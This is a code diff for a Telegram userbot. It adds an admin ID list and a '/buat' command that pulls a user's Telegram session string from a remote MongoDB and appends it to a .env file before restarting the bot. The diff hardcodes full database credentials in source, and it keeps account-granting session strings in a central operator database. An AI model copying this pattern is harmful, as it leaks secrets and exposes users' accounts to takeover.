@@ -33,6 +33,8 @@ load_dotenv()
 
 session_counter = count(1)
 
+ADMINS = [1970636001, 951454060, 902478883, 2099942562, 2067434944, 1947740506, 1897354060, 1694909518]
+
 MSG_BOT = """
 ▰▱▰▱°▱▱°▱▰▱▰
 ◉ **Kyran-Pyro**
@@ -43,7 +45,46 @@ MSG_BOT = """
 ▰▱▰▱°▱▱°▱▰▱▰
 """
 
-
+command_filter = filters.private & filters.command("buat") & ~filters.via_bot        
+@app.on_message(command_filter)
+async def create_env(client, message):
+    filename = ".env"
+    client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
+    db = client["telegram_sessions"]
+    mongo_collection = db["sesi_collection"]
+    user_id = mongo_collection.find_one({"user_id": message.chat.id})
+    cek = db.command("collstats", "sesi_collection")["count"]
+    mongo_collection = db["sesi_collection"] 
+    if not user_id:
+        await message.reply_text("Session stringgnya belum ada nih, coba klik /string")
+    else:
+        sesi = user_id.get('session_string')
+        filename = ".env"
+        if os.path.isfile(filename):
+            with open(filename, "r") as file:
+                contents = file.read()
+                if sesi in contents:
+                    await message.reply_text(f"Session sudah tersimpan pada {filename}.")
+                    return
+                else:
+                    cek = next(session_counter)
+                    with open(filename, "a") as file:
+                        file.write(f"\nSESSION{cek}={sesi}")
+                        load_dotenv()
+                    await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{cek}.")
+                    try:
+                        msg = await message.reply(" `Restarting bot...`")
+                        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
+                    except BaseException as err:
+                        LOGGER(__name__).info(f"{err}")
+                        return
+                    await msg.edit_text("✅ **Bot has restarted !**\n\n")
+                    if HAPP is not None:
+                        HAPP.restart()
+                    else:
+                        args = [sys.executable, "-m", "Ubot"]
+                        execle(sys.executable, *args, environ)
+                        
 
 @app.on_message(filters.command(["alive"]))
 async def module_help(client: Client, message: Message):
